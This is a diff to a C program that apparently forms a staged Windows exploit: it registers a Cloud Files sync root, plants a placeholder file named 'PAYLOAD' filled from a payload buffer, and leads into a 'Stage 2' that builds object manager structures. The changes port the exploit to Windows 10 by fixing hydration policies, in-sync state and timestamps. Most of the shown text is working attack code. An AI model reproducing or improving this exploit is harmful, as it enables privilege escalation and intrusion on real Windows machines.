@@ -338,10 +338,15 @@ int main() {
 
     CF_SYNC_POLICIES policies = { 0 };
     policies.StructSize = sizeof(policies);
-    policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
-    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
+    // WIN10 FIX: Use ALWAYS_FULL for more reliable placeholder hydration
+    policies.Hydration.Primary = CF_HYDRATION_POLICY_ALWAYS_FULL;
+    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
+    policies.Population.Primary = CF_POPULATION_POLICY_ALWAYS_FULL;
+    policies.InSync.HardLink = CF_INSYNC_POLICY_NONE;
+    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
 
-    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_NONE);
+    // WIN10 FIX: Use UPDATE_IF_EXISTS to handle re-runs
+    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_UPDATE);
     if (FAILED(hr)) {
         printf("[-] CfRegisterSyncRoot failed: 0x%08X\n", hr);
         CloseHandle(g_hPipe);
@@ -366,19 +371,48 @@ int main() {
     }
     printf("[+] Cloud callback connected\n");
 
-    // Create placeholder file
+    // WIN10 FIX: Mark sync root as in-sync BEFORE creating placeholders
+    // This fixes ERROR_CLOUD_FILE_NOT_IN_SYNC (0x8007017C)
+    hr = CfSetInSyncState(g_workDir, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
+    if (FAILED(hr)) {
+        printf("[!] CfSetInSyncState on root failed: 0x%08X (non-fatal)\n", hr);
+    } else {
+        printf("[+] Sync root marked in-sync\n");
+    }
+
+    // Create placeholder file with proper metadata for Win10
     CF_PLACEHOLDER_CREATE_INFO placeholder = { 0 };
     placeholder.RelativeFileName = L"PAYLOAD";
     placeholder.FsMetadata.FileSize.QuadPart = sizeof(g_payload);
     placeholder.FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
-    placeholder.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
+
+    // WIN10 FIX: Set timestamps (required on Win10, optional on Win11)
+    FILETIME ft;
+    GetSystemTimeAsFileTime(&ft);
+    placeholder.FsMetadata.BasicInfo.CreationTime.LowPart = ft.dwLowDateTime;
+    placeholder.FsMetadata.BasicInfo.CreationTime.HighPart = ft.dwHighDateTime;
+    placeholder.FsMetadata.BasicInfo.LastWriteTime = placeholder.FsMetadata.BasicInfo.CreationTime;
+    placeholder.FsMetadata.BasicInfo.LastAccessTime = placeholder.FsMetadata.BasicInfo.CreationTime;
+    placeholder.FsMetadata.BasicInfo.ChangeTime = placeholder.FsMetadata.BasicInfo.CreationTime;
+
+    // WIN10 FIX: Use SUPERSEDE flag if file exists, and always mark in-sync
+    placeholder.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC | CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;
 
     DWORD processed = 0;
     hr = CfCreatePlaceholders(g_workDir, &placeholder, 1, CF_CREATE_FLAG_NONE, &processed);
     if (FAILED(hr)) {
         printf("[-] CfCreatePlaceholders failed: 0x%08X\n", hr);
+        if (hr == 0x8007017C) {
+            printf("[-] ERROR_CLOUD_FILE_NOT_IN_SYNC - sync root state issue\n");
+            printf("[*] Try: attrib -P -U %ws (clear cloud attributes)\n", g_workDir);
+        }
     } else {
-        printf("[+] Placeholder file created\n");
+        printf("[+] Placeholder file created (%d processed)\n", processed);
+
+        // WIN10 FIX: Also mark the placeholder itself in-sync
+        wchar_t placeholderPath[MAX_PATH];
+        swprintf(placeholderPath, MAX_PATH, L"%ws\\PAYLOAD", g_workDir);
+        CfSetInSyncState(placeholderPath, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
     }
 
     // Stage 2: Create object manager structures
